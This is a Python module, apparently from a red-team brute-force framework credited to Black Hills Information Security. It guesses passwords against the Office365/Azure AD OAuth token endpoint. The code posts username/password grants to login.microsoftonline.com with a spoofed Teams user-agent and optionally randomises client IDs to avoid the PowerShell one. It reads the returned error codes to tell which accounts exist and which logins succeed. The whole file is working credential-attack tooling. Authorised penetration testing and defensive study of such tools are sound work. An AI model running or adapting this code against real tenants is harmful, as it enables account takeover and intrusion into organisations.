import re
import inspect
from bfg.data import loadAzureSSOSoap
from bfg.args import http as http_args, argument
from requests import Session
from bfg.shortcuts.http import HTTPModule, handleUA
from bfg.shortcuts.azure import *
from requests.exceptions import ConnectionError

MSONLINE_URL    = 'https://login.microsoftonline.com'
MSONLINE_NETLOC = 'login.microsoftonline.com'
O365_URL        = 'https://outlook.office365.com'
AUTH_PATH       = '/common/oauth2/token'

#DEFAULT_RESOURCE_URL  = 'https://graph.windows.net'
#DEFAULT_CLIENT_ID     = '1b730954-1685-4b74-9bfd-dac224a7b894'
DEFAULT_RESOURCE_URL = 'https://graph.microsoft.com'
DEFAULT_CLIENT_ID    = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'
DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit' \
        '/537.36 (KHTML, like Gecko) Teams/1.2.00.34161 Chrome/66.0' \
        '.3359.181 Electron/3.1.13 Safari/537.36'

def strip_slash(s):

    if s and s[-1] == '/':
        s=s[:len(s)-1]

    return s

class Session(Session):

    def __init__(self, url, headers=None, allow_redirects=True,
            verify_ssl=False, *args, **kwargs):

        super().__init__(*args, **kwargs)

        # Configure redirects
        self.allow_redirects=allow_redirects

        # using the setattr builtin here because requests.Session
        # doesn't care for new instance variables beinga assigned
        setattr(self,'verify_ssl',verify_ssl)

        # Update MSOL URL
        self.url = strip_slash(url)

        # Update headers
        headers = headers if headers else {}
        headers['Accept']='application/json'
        self.headers.update(headers)

    def authenticate(self, username, password, client_id,
            resource_url):
        '''Authenticate the credentials via the Graph API.
        '''

        credential = f'{username}:{password}'

        # ==================================
        # PREPARE THE CLIENT/RESOURCE VALUES
        # ==================================

        if resource_url == 'RANDOM':
            name, resource_url = getRandomResource()

        if client_id == 'RANDOM':
            while True:
                client_id = getRandomListItem(
                    MSOL_UNIVERSAL_CLIENT_IDS)
                if client_id != '1b730954-1685-4b74-9bfd-dac224a7b894':
                    # Loop until the client_id is not PowerShell
                    break

        # ================
        # MAKE THE REQUEST
        # ================

        # Create the POST data
        data = {'resource':resource_url,
            'client_id':client_id,
            'client_info':'1',
            'grant_type':'password',
            'username':username,
            'password':password,
            'scope':'openid'}

        # Make the post request
        resp = self.post(self.url+AUTH_PATH,
                data=data,
                allow_redirects=self.allow_redirects,
                verify=self.verify_ssl)

        # ===================
        # HANDLE THE RESPONSE
        # ===================

        # Search the response for error codes
        error_code = re.search(ERROR_CODE_RE, resp.text)
        if error_code:

            error_code = error_code.groups()[0]
            outcome, username_valid, events = \
                lookupCode(resp.status_code, error_code)

            if events:
                events[0] += f' - {credential}'

            return outcome, username_valid, events

        else:

            if resp.status_code == 200:
                return 1, True, ['200 OK response']
            else:
                return -1, True, ['Unhandled response event occurred']

def url():

    return http_args.url(
        name_or_flags=('--url',),
        required=False,
        default=MSONLINE_URL,
        help='Microsoft Online URL to target. Default: %(default)s')

@argument
def clientID(name_or_flags=('--client-id',),
        default=DEFAULT_CLIENT_ID,
        help='Client ID (UUID) to use. EXPERIMENTAL: Supply RANDOM to '
            'select a random value. Default: %(default)s'):
    pass

@argument
def resourceURL(name_or_flags=('--resource-url',),
        default=DEFAULT_RESOURCE_URL,
        help='Resource URL to use. EXPERIMENTAL: Supply RANDOM to '
            'select a random value. Default: %(default)s'):
    pass

def user_agent():

    return http_args.url(
        name_or_flags=('--user-agent',),
        required=False,
        default=DEFAULT_UA,
        help='User-Agent header value. Defaults to Teams: %(default)s')

class Module(HTTPModule):

    brief_description = 'Office365 Graph API'

    description = 'Brute force the Office365 Graph API.'

    args = [url(), user_agent()] + \
            http_args.getDefaults(
                'url', 'user_agent',
                invert=True) + \
            [clientID(), resourceURL(),]

    contributors = [
            dict(
                name='Michael Allen [Researcher]',
                additional=dict(
                    company='Black Hills Information Security')),
            dict(
                name='Justin Angel [Module Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu')),
            dict(
                name='Steve Borosh [Lead Researcher]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@rvrsh3ll')),
            dict(
                name='Corey Ham [Researcher]',
                additional=dict(
                    company='Black Hills Information Security')),
        ]

    references = [
            'Gerenios - Client IDs - https://github.com/Gerenios/' \
                'AADInternals/blob/master/AccessToken_utils.ps1#L11',
            'rvrsh3ll - Obscure error handling - https://github.com/' \
                'rvrsh3ll/aad-sso-enum-brute-spray',
        ]

    def __post_init__(self, client_id, resource_url,
            *args, **kwargs):

        self.client_id = client_id
        self.resource_url = resource_url

    @handleUA 
    def __call__(self, username, password, *args, **kwargs):
        '''Proxy the call request up to the Session object to perform
        authentication.
        '''

        session = Session(url=self.url,
                headers=self.headers,
                verify_ssl=self.verify_ssl,
                allow_redirects=self.allow_redirects)

        if self.proxies:
            session.proxies.update(self.proxies)

        try:

            outcome, valid_account, events = \
                session.authenticate(
                    username = username,
                    password = password,
                    client_id = self.client_id,
                    resource_url = self.resource_url)

        except ConnectionError:

            return dict(
                outcome=-1,
                username=username,
                password=password,
                events=['Connection timed out'])

        events = events if events else []

        return dict(outcome=outcome,
                username=username,
                password=password,
                actionable=valid_account,
                events=events)




